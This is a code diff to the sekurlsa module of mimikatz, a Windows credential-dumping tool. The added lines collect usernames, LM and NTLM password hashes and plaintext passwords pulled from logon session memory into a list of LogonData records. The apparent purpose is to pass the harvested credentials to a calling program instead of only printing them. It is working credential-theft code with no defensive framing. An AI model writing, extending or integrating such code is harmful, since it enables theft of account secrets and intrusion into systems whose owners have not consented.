@@ -4,6 +4,7 @@
 	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kuhl_m_sekurlsa.h"
+#include "../../retval.h"
 
 const KUHL_M_C kuhl_m_c_sekurlsa[] = {
 	{kuhl_m_sekurlsa_msv,				L"msv",				L"Lists LM & NTLM credentials"},
@@ -1049,15 +1050,21 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 						kprintf(L"\n\t * Username : %wZ\n\t * Domain   : %wZ", (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToUserName), (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToLogonDomain));
 						if(!pMSVHelper->offsetToisIso || !*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisIso))
 						{
+							PUNICODE_STRING username = (PUNICODE_STRING)(msvCredentials + pMSVHelper->offsetToUserName);
+							BYTE* lmHash = NULL;
+							BYTE* ntlmHash = NULL;
+
 							if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisLmOwfPassword))
 							{
 								kprintf(L"\n\t * LM       : ");
 								kull_m_string_wprintf_hex(msvCredentials + pMSVHelper->offsetToLmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
+								lmHash = msvCredentials + pMSVHelper->offsetToLmOwfPassword;
 							}
 							if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisNtOwfPassword))
 							{
 								kprintf(L"\n\t * NTLM     : ");
 								kull_m_string_wprintf_hex(msvCredentials + pMSVHelper->offsetToNtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
+								ntlmHash = msvCredentials + pMSVHelper->offsetToNtOwfPassword;
 							}
 							if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisShaOwPassword))
 							{
@@ -1071,6 +1078,11 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 							}
 							if(sid && (*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisNtOwfPassword) || *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisShaOwPassword)))
 								kuhl_m_dpapi_oe_credential_add(sid, NULL, *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisNtOwfPassword) ? msvCredentials + pMSVHelper->offsetToNtOwfPassword : NULL, *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisShaOwPassword) ? msvCredentials + pMSVHelper->offsetToShaOwPassword : NULL, NULL, NULL);
+
+							if ((lmHash != NULL) || (ntlmHash != NULL))
+							{
+								List_addItem(s_list, LogonData_create(username->Buffer, username->Length, NULL, 0, lmHash, ntlmHash));
+							}
 						}
 						else
 						{
@@ -1219,6 +1231,12 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 						L"\n\t * Domain   : %wZ"
 						L"\n\t * Password : "
 						, username, domain);
+					
+					if (username && password && username->Buffer && password->Buffer && username->Length && password->Length)
+					{
+						LogonData* data = LogonData_create(username->Buffer, username->Length, password->Buffer, password->Length, NULL, NULL);
+						List_addItem(s_list, data);
+					}
 
 					if(!password || kull_m_string_suspectUnicodeString(password))
 					{
